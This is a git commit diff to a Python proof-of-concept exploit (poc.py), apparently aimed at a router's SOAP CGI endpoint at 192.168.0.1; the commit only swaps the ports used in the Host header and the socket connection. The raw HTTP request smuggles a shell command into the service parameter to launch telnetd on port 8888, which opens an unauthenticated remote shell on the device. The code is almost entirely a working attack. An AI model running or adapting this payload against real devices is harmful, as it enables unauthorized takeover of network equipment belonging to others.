b7b22556f39c157f08419bf6a5ddc6994ac8132d
songzzang <69359991+songah119@users.noreply.github.com>
2024-03-12 11:06:31 +0900

    Update poc.py

--- poc.py
+++ poc.py
@@ -4,13 +4,13 @@ from os import *
 from time import *
  
 request = b"POST /soap.cgi?service=&&telnetd -p 8888&& HTTP/1.1\r\n"
-request += b"Host: localhost:49152\r\n"
+request += b"Host: localhost:80\r\n"
 request += b"Content-Type: text/xml\r\n"
 request += b"Content-Length: 88\r\n"
 request += b"SOAPAction: a#b\r\n\r\n"
  
 s = socket(AF_INET, SOCK_STREAM)
-s.connect((gethostbyname("192.168.0.1"), 80))
+s.connect((gethostbyname("192.168.0.1"), 49152))
 s.send(request)
  
 sleep(1)
